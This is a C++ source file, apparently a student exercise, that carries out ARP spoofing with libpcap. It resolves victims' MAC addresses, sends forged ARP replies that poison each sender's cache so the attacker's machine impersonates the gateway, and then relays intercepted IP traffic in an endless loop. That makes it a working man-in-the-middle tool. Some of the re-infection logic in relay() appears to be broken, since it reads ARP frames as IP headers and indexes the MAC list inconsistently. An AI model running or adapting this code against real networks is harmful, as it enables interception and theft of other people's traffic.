#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <net/if_arp.h>
#include <stdint.h>

#define MAC_len 6

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct Eth_header{
    uint8_t dst_mac[MAC_len];
    uint8_t src_mac[MAC_len];
    uint16_t type;
};

struct Ip_header{
    uint8_t head_len;
    uint8_t field;
    uint16_t Total_len;
    uint16_t id;
    uint16_t offset;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t check;
    uint32_t src_ip;
    uint32_t dst_ip;
};

void usage() {
    printf("syntax: send-arp-test <interface> <sender1 ip> <target1 ip> <sender2 ip> <target2 ip> ...\n");
    printf("sample: send-arp-test ens33 192.168.30.23 192.168.30.1 ........\n");
}

int isequal(uint8_t *a, uint8_t *b, int len)
{
    for(int i = 0; i<len;i++)
    {
        if(a[i]!=b[i]){
            return 0;
        }
    }
    printf("\n\n\n");
    return 1;
}

int GetIpAdd (const char * ifr, unsigned char * out) {
    int sockfd;
    struct ifreq ifrq;
    struct sockaddr_in * sin;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifrq.ifr_name, ifr);
    if (ioctl(sockfd, SIOCGIFADDR, &ifrq) < 0) {
        perror( "ioctl() SIOCGIFADDR error");
        return -1;
    }
    sin = (struct sockaddr_in *)&ifrq.ifr_addr;
    memcpy (out, (void*)&sin->sin_addr, sizeof(sin->sin_addr));

    close(sockfd);

    return 4;
}

int GetMacAdd(const char *ifname, uint8_t *mac_addr)
{
    struct ifreq ifr;
    int sockfd, ret;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0){
        printf("Fail to get interface MAC address - socket() failed - %m\n");
        return -1;
    }
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if(ret < 0)
    {
        printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sockfd);
        return -1;
    }
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, MAC_len);

    close(sockfd);

    return 0;
}

void arp_request(char* ip, EthArpPacket req, pcap_t* handle, uint8_t *mac_list)
{
    req.arp_.tip_ = htonl(Ip(ip));
    int iscontinue = 1;
    while(iscontinue)
    {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&req), sizeof(EthArpPacket));
        printf("\nSend ARP Packet!! >> %s\n", ip);
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
        for(int j = 0; j < 5; j++)
        {
            pcap_next_ex(handle, &header, &packet);
            EthArpPacket *reply_packet = (EthArpPacket*)packet;
            if((ntohl(reply_packet->arp_.sip_) == Ip(ip)) && (ntohs(reply_packet->eth_.type_) == EthHdr::Arp) && (ntohs(reply_packet->arp_.op_) == ArpHdr::Reply))
            {
                memcpy(mac_list, packet+MAC_len, MAC_len);
                printf("Get Mac(%s): ", ip);
                for(int k = 0; k < MAC_len; k++) printf("%02x ", mac_list[k]);
                printf("\n\n\n");
                iscontinue = 0;
                break;
            }
        }
    }
}

void arp_table(int argc, char** argv, uint8_t **get_mac)
{
    int j = 1;
    printf("**Finish ARP**\n");
    printf("[Number]\t[IP]\t\t\t\t[MAC]\n");
    for(int i = 2; i<argc; i++)
    {
        if(i % 2 == 0) printf("%d\t\t%s\t\t\t", j, argv[i]);
        else
        {
            printf("%d\t\t%s(Gateway)\t\t", j,argv[i]);
            j++;
        }
        for(int j = 0; j < MAC_len; j++) printf("%02x ", get_mac[i-2][j]);
        printf("\n");
    }

    printf("\n\n**ARP Spoofing Attack**\n");
    printf("===========================================\n\n");
}

void infect(char* senderip, char* targetip, pcap_t* handle, uint8_t *mac, uint8_t *attack_mac)
{
    EthArpPacket arp_infect_packet;

    arp_infect_packet.eth_.smac_ = Mac(attack_mac);
    arp_infect_packet.eth_.type_ = htons(EthHdr::Arp);
    arp_infect_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    arp_infect_packet.arp_.pro_ = htons(EthHdr::Ip4);
    arp_infect_packet.arp_.hln_ = Mac::SIZE;
    arp_infect_packet.arp_.pln_ = Ip::SIZE;
    arp_infect_packet.arp_.op_ = htons(ArpHdr::Reply);
    arp_infect_packet.arp_.smac_ = Mac(attack_mac);
    arp_infect_packet.eth_.dmac_ = Mac(mac);
    arp_infect_packet.arp_.sip_ = htonl(Ip(targetip)); //Gateway
    arp_infect_packet.arp_.tmac_ = Mac(mac);
    arp_infect_packet.arp_.tip_ = htonl(Ip(senderip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_infect_packet), sizeof(EthArpPacket));
    printf("\nSend ARP infect Packet!! >> %s\n",senderip);
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n\n", res, pcap_geterr(handle));
    }
    printf("\n\n===========================================\n\n\n");
}

void relay(pcap_t* handle, uint8_t mac_list[][6], uint8_t *attack_mac, char* argv[], int argc)
{
    uint8_t relay_packet[2000] = {0};
    struct pcap_pkthdr* header;
    const u_char* packet;
    uint8_t broad[MAC_len] = {0xff,0xff,0xff,0xff,0xff,0xff};

    pcap_next_ex(handle, &header, &packet);
    struct Eth_header *eth;
    eth = (struct Eth_header*)packet;
    int datalen = sizeof(*eth);

    memcpy(relay_packet, packet, header->caplen);
    for(int i = 2; i < argc; i+=2)
    {
        if(isequal(eth->src_mac, mac_list[i-2], MAC_len) && isequal(eth->dst_mac, attack_mac, MAC_len))
        {
            if(ntohs(eth->type) == EthHdr::Ip4)
            {
                memcpy(relay_packet, mac_list[i-1], MAC_len);
                memcpy(relay_packet+MAC_len, attack_mac, MAC_len);
                int res = pcap_sendpacket(handle, relay_packet, header->caplen);
                printf("\nSend ARP relay Packet!! >> \n");
                if (res != 0) {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n\n", res, pcap_geterr(handle));
                }
            }
        }
        else if(isequal(eth->src_mac, mac_list[i-2], MAC_len) && isequal(eth->dst_mac, broad, MAC_len) && ntohs(eth->type) == EthHdr::Arp)
        {
            struct Ip_header *iph;
            iph = (struct Ip_header*)(packet+datalen);
            if((ntohl(iph->dst_ip) == Ip(argv[i+1])) && ntohs(iph->protocol)==ArpHdr::Request)
            {
                infect(argv[i], argv[i+1], handle, mac_list[i], attack_mac);
            }
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 2 || argc % 2 != 0) {
        usage();
        return -1;
    }
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    //IP
    uint8_t attack_ip0[4];
    GetIpAdd(argv[1], attack_ip0);
    uint32_t attack_ip = ((attack_ip0[0] << 24) | (attack_ip0[1] << 16) | (attack_ip0[2]<< 8) | (attack_ip0[3]));

    //MAC
    uint8_t attack_mac[MAC_len];
    GetMacAdd(argv[1], attack_mac);

    uint8_t get_mac[argc-2][MAC_len];

    //ARP_Request
    EthArpPacket req_packet;

    req_packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    req_packet.eth_.smac_ = Mac(attack_mac);
    req_packet.eth_.type_ = htons(EthHdr::Arp);
    req_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    req_packet.arp_.pro_ = htons(EthHdr::Ip4);
    req_packet.arp_.hln_ = Mac::SIZE;
    req_packet.arp_.pln_ = Ip::SIZE;
    req_packet.arp_.op_ = htons(ArpHdr::Request);
    req_packet.arp_.smac_ = Mac(attack_mac);
    req_packet.arp_.sip_ = htonl(Ip(attack_ip));
    req_packet.arp_.tmac_ = Mac("00:00:00:00:00:00");

    for(int i = 2; i < argc; i++) arp_request(argv[i], req_packet, handle, get_mac[i-2]);

    printf("\n\n**ARP Infect**\n");
    printf("===========================================\n\n");

    //ARP Infect
    for(int i = 2; i<argc-1; i+=2) infect(argv[i], argv[i+1], handle, get_mac[i-2], attack_mac);

    //ARP Relay
    int iscontinue = 1;
    while(iscontinue)
    {
        relay(handle, get_mac, attack_mac, &argv[0], argc);
    }
    pcap_close(handle);
}
